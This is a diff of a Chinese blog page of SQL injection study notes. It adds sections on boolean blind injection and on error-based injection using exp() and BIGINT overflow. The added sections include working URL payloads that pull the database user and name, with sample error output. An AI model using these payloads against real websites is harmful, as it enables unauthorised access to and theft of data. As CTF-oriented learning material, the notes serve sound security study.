@@ -319,9 +319,9 @@
               
               <a class="tag" href="/tags/#WEB" title="WEB">WEB</a>
               
-              <a class="tag" href="/tags/#白帽子讲WEB安全" title="白帽子讲WEB安全">白帽子讲WEB安全</a>
-              
               <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+              
+              <a class="tag" href="/tags/#白帽子讲WEB安全" title="白帽子讲WEB安全">白帽子讲WEB安全</a>
               
             </div>
             <h1>SQL注入攻击的学习</h1>
@@ -336,11 +336,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">8</span> Minutes
+              Estimated Reading Time <span class="post-count">10</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">2k</span> In Total
+              Words <span class="post-count">2.6k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -408,7 +408,14 @@
 <li>用户能够控制数据的输入</li>
 <li>原本要执行的代码，拼接了用户的输入</li>
 </ol>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>在MYSQL中有个函数，用来测试函数性能的，BENCHMARK（）函数，他有两个参数</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><ul>
+<li>我们可以利用逻辑判断进行<strong>截取字符串</strong>相关操作</li>
+<li><code>left(database(),1)&gt;&#39;s&#39;</code><br>表示从<code>database()</code><strong>左侧</strong>截取前<code>1</code>为<code>大于&#39;s&#39;</code></li>
+<li><code>ascii(substr((select database()),1,1))=98</code><br><code>substr(a,b,c)</code>表示从<code>b</code>位置开始，截取<code>a</code>的<code>c</code>长度，<code>ascii()</code>将某个字符转化为<strong>ascii值</strong></li>
+<li>正则注入<br>用法:<code>select user() regexp &#39;^[a-z]&#39;;</code><br>假如用户名为root，第二位可以用<code>select user() regexp &#39;^ro&#39;</code>表示<br>示例:<br><code>select * from users where id=1 and 1=(if((user() regexp &#39;^r&#39;),1,0));</code></li>
+<li>like匹配注入<br>和上述正则类似<br>用法：<code>select user() like &#39;ro%&#39;</code></li>
+</ul>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>在MYSQL中有个函数，用来测试函数性能的，BENCHMARK（）函数，他有两个参数</p>
 <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">BENCHMARK(<span class="params">count</span>,<span class="params">expr</span>)</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="BENCHMARK.png.jpg" alt="BENCHMARK.png"></p>
@@ -495,6 +502,38 @@
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="literal">null</span>,concat(<span class="number">0x7e</span>,(select datadir),<span class="number">0x7e</span>))两个参数位</span><br></pre></td></tr></table></figure>
 
 <p>==updatexml和extractvalue函数的返回长度有限,均为32个字符长度==</p>
+<ul>
+<li>利用double数据类型超出范围进行报错注入(exp注入)</li>
+<li>利用bigint溢出报错注入(!溢出报错注入)</li>
+<li>利用数据的重复性报错注入</li>
+<li>利用了MySQL的第8652号bug ：<br>Bug #8652 group by part of rand() returns duplicate key error来进行的盲注</li>
+<li>…</li>
+</ul>
+<h5 id="利用double数据类型超出范围进行报错注入"><a href="#利用double数据类型超出范围进行报错注入" class="headerlink" title="利用double数据类型超出范围进行报错注入"></a>利用double数据类型超出范围进行报错注入</h5><ul>
+<li><p>当传递一个大于709的值时，函数<code>exp()</code>就会引起一个溢出错误。</p>
+</li>
+<li><p><code>exp()</code>就是以e为底的对数函数</p>
+<p>payload：</p>
+</li>
+</ul>
+<p><code>?id=1&#39; and exp(~(select * from(select user())a))--+</code><br>(这一条我没有测试成功，不知道是因为数据库版本太高被修复还是因为别的原因)<br>我用了两种数据库的结果：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOUBLE value is out of range in 'exp(~((<span class="keyword">select</span> <span class="symbol">`a`</span>.<span class="symbol">`user()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">AS</span> <span class="symbol">`user()`</span>) <span class="symbol">`a`</span>)))<span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p>和</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> range <span class="keyword">in</span> <span class="string">'exp(~(select #))'</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>有知道原因的大佬帮忙解答一下（估计是因为数据库版本限制）</strong></p>
+<hr>
+<h5 id="利用bigint溢出报错注入"><a href="#利用bigint溢出报错注入" class="headerlink" title="利用bigint溢出报错注入"></a>利用bigint溢出报错注入</h5><ul>
+<li>数据类型BIGINT的长度为8字节，也就是说，长度为64比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”。 当对这个值进行某些数值运算的时候，比如加法运算，就会引起“BIGINT value is out of range”错误。</li>
+<li>说的简单点就是数据库中有一个最大值，超过这个值就会引起溢出报错，我们执行一个<code>~0</code>即是返回无符号的最大值，<code>~0+1</code>即会爆出溢出错误</li>
+<li>我们可以利用子查询引起BITINT溢出，从而设法提取数据</li>
+</ul>
+<p>payload</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or ~0+!(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<hr>
 <h3 id="转义注入"><a href="#转义注入" class="headerlink" title="转义注入"></a>转义注入</h3><p>特点为有两个变量，比如有admin和passwd，这时可以在前一个变量最后加上\转义后面的单引号，导致后面变量的前一个单引号被闭合，再在第二个变量处进行注入，为转义注入</p>
 <p>例子：</p>
 <h4 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h4><p>因为是简单注入</p>
@@ -661,7 +700,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#《白帽子讲web安全》SQL注入深度学习"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">《白帽子讲web安全》SQL注入深度学习</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#盲注"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">盲注</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#读写文件注入（load-file）"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">读写文件注入（load_file）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#查看secure-file-priv的命令"><span class="toc-nav-number">1.3.0.1.</span> <span class="toc-nav-text">查看secure_file_priv的命令</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#解决方法"><span class="toc-nav-number">1.3.0.2.</span> <span class="toc-nav-text">解决方法</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#宽字节注入"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">宽字节注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#0x01-认识addslashes"><span class="toc-nav-number">1.4.0.1.</span> <span class="toc-nav-text">0x01 认识addslashes</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#0x02-宽字节注入原理"><span class="toc-nav-number">1.4.0.2.</span> <span class="toc-nav-text">0x02 宽字节注入原理</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL-Column-Truncation-长度绕过"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">SQL Column Truncation(长度绕过)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CTF技巧"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">CTF技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#被过滤"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">被过滤</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#注释符"><span class="toc-nav-number">1.6.1.1.</span> <span class="toc-nav-text">注释符</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#information"><span class="toc-nav-number">1.6.1.2.</span> <span class="toc-nav-text">information</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#and-or-空格-等连接词"><span class="toc-nav-number">1.6.1.3.</span> <span class="toc-nav-text">and or 空格 等连接词</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#无列表注入"><span class="toc-nav-number">1.6.2.</span> <span class="toc-nav-text">无列表注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#报错注入"><span class="toc-nav-number">1.6.3.</span> <span class="toc-nav-text">报错注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#转义注入"><span class="toc-nav-number">1.6.4.</span> <span class="toc-nav-text">转义注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#BJDCTF-2nd-简单注入"><span class="toc-nav-number">1.6.4.1.</span> <span class="toc-nav-text">[BJDCTF 2nd]简单注入</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#regexp正则注入"><span class="toc-nav-number">1.6.5.</span> <span class="toc-nav-text">regexp正则注入</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#《白帽子讲web安全》SQL注入深度学习"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">《白帽子讲web安全》SQL注入深度学习</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#盲注"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">盲注</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#bool盲注"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">bool盲注</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#时间盲注"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">时间盲注</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#读写文件注入（load-file）"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">读写文件注入（load_file）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#查看secure-file-priv的命令"><span class="toc-nav-number">1.3.0.1.</span> <span class="toc-nav-text">查看secure_file_priv的命令</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#解决方法"><span class="toc-nav-number">1.3.0.2.</span> <span class="toc-nav-text">解决方法</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#宽字节注入"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">宽字节注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#0x01-认识addslashes"><span class="toc-nav-number">1.4.0.1.</span> <span class="toc-nav-text">0x01 认识addslashes</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#0x02-宽字节注入原理"><span class="toc-nav-number">1.4.0.2.</span> <span class="toc-nav-text">0x02 宽字节注入原理</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL-Column-Truncation-长度绕过"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">SQL Column Truncation(长度绕过)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CTF技巧"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">CTF技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#被过滤"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">被过滤</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#注释符"><span class="toc-nav-number">1.6.1.1.</span> <span class="toc-nav-text">注释符</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#information"><span class="toc-nav-number">1.6.1.2.</span> <span class="toc-nav-text">information</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#and-or-空格-等连接词"><span class="toc-nav-number">1.6.1.3.</span> <span class="toc-nav-text">and or 空格 等连接词</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#无列表注入"><span class="toc-nav-number">1.6.2.</span> <span class="toc-nav-text">无列表注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#报错注入"><span class="toc-nav-number">1.6.3.</span> <span class="toc-nav-text">报错注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#利用double数据类型超出范围进行报错注入"><span class="toc-nav-number">1.6.3.0.1.</span> <span class="toc-nav-text">利用double数据类型超出范围进行报错注入</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#利用bigint溢出报错注入"><span class="toc-nav-number">1.6.3.0.2.</span> <span class="toc-nav-text">利用bigint溢出报错注入</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#转义注入"><span class="toc-nav-number">1.6.4.</span> <span class="toc-nav-text">转义注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#BJDCTF-2nd-简单注入"><span class="toc-nav-number">1.6.4.1.</span> <span class="toc-nav-text">[BJDCTF 2nd]简单注入</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#regexp正则注入"><span class="toc-nav-number">1.6.5.</span> <span class="toc-nav-text">regexp正则注入</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -685,9 +724,9 @@
             
             <a class="tag" href="/tags/#WEB" title="WEB">WEB</a>
             
-            <a class="tag" href="/tags/#白帽子讲WEB安全" title="白帽子讲WEB安全">白帽子讲WEB安全</a>
-            
             <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+            
+            <a class="tag" href="/tags/#白帽子讲WEB安全" title="白帽子讲WEB安全">白帽子讲WEB安全</a>
             
           </div>
         </section>
